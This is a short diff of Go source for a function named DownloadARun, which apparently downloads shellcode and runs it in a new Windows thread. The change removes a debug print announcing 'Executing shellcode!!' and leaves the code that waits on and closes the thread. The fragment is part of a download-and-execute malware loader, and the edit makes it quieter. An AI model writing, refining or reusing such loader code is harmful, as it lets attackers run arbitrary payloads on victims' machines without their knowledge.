@@ -151,7 +151,6 @@ func DownloadARun(url string) error {
 	if err != nil || status != 0 {
 		return fmt.Errorf("thread creation failed completely wtf ??? is wrong")
 	}
-	fmt.Println("Executing shellcode!!")
 	windows.WaitForSingleObject(windows.Handle(hThread), windows.INFINITE)
 	windows.CloseHandle(windows.Handle(hThread))
 
